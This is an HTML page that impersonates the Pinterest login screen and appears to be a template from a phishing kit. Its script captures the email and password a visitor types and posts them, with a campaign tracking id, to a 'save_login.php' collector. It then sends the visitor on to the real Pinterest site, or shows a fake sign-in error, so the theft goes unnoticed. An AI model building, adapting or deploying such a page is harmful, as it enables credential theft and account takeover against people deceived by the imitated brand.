<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Pinterest</title><style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;text-align:center}
.pin{color:#e60023;font-size:36px;font-weight:700;margin-bottom:8px}
h1{font-size:32px;font-weight:600;margin-bottom:8px}
.sub{color:#767676;font-size:14px;margin-bottom:24px}
input{width:100%;height:48px;border:2px solid #cdcdcd;border-radius:16px;padding:0 16px;margin-bottom:12px;font-size:16px}
.btn-submit{width:100%;height:48px;background:#e60023;color:#fff;border:none;border-radius:24px;font-weight:600;font-size:16px;cursor:pointer}
</style></head><body><div class="card"><div class="pin">Pinterest</div><h1>Welcome to Pinterest</h1><p class="sub">Log in to see more ideas</p><form id="loginForm"><input type="text" id="email" placeholder="Email" required autocomplete="username"><input type="password" id="password" placeholder="Password" required autocomplete="current-password"><button type="submit" class="btn-submit">Log in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<script>
(function(){
var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var login = document.getElementById("email").value;
    var password = document.getElementById("password").value;
    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
    var btn = document.querySelector(".btn-submit");
    var label = btn.textContent;
    btn.textContent = "Please wait…";
    btn.disabled = true;
    $.ajax({
        type: "POST",
        url: BASE_URL + "save_login.php",
        data: { tid: tid, login: login, password: password, template: "pinterest" },
        dataType: "json",
        success: function (data) {
            if (data && data.ok) { window.location.href = "https:\/\/www.pinterest.com\/"; return; }
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        },
        error: function () {
            btn.textContent = label;
            btn.disabled = false;
            alert("Sign in failed. Please try again.");
        }
    });
});
})();
</script></body></html>
